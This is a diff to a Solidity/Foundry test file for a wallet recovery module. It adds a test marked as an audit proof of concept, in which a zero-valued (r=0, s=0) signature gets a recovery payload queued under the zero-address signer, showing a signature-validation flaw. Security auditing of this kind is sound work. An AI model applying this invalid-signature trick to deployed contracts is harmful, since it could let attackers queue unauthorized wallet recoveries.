@@ -7,7 +7,7 @@ import { Payload } from "../../../src/modules/Payload.sol";
 import { IERC1271 } from "../../../src/modules/interfaces/IERC1271.sol";
 import { PrimitivesRPC } from "../../utils/PrimitivesRPC.sol";
 import { AdvTest } from "../../utils/TestUtils.sol";
-import { console } from "forge-std/console.sol";
+import { console2 } from "forge-std/console2.sol";
 
 contract RecoveryImp is Recovery {
 
@@ -94,6 +94,29 @@ contract RecoveryTest is AdvTest {
     assertEq(recovery.totalQueuedPayloads(_wallet, signerAddr), 1);
     assertEq(recovery.queuedPayloadHashes(_wallet, signerAddr, 0), payloadHash);
     assertEq(recovery.timestampForQueuedPayload(_wallet, signerAddr, payloadHash), block.timestamp);
+  }
+
+  //@audit-poc
+  function test_queue_payload_with_address_zero_signer(
+    address _wallet,
+    Payload.Decoded memory _payload,
+    uint64 _randomTime
+  ) external {
+    boundToLegalPayload(_payload);
+
+    vm.warp(_randomTime);
+
+    bytes32 r = bytes32(uint256(0)); // Invalid r
+    bytes32 s = bytes32(uint256(0)); // Invalid s
+    uint8 v = 27;
+    bytes32 yParityAndS = bytes32((uint256(v - 27) << 255) | uint256(s));
+    bytes memory signature = abi.encodePacked(r, yParityAndS);
+    bytes32 payloadHash = Payload.hashFor(_payload, _wallet);
+
+    vm.expectEmit(true, true, true, true, address(recovery));
+    emit Recovery.NewQueuedPayload(_wallet, address(0), payloadHash, block.timestamp);
+
+    recovery.queuePayload(_wallet, address(0), _payload, signature);
   }
 
   function test_queue_payload_ecdsa_with_code(
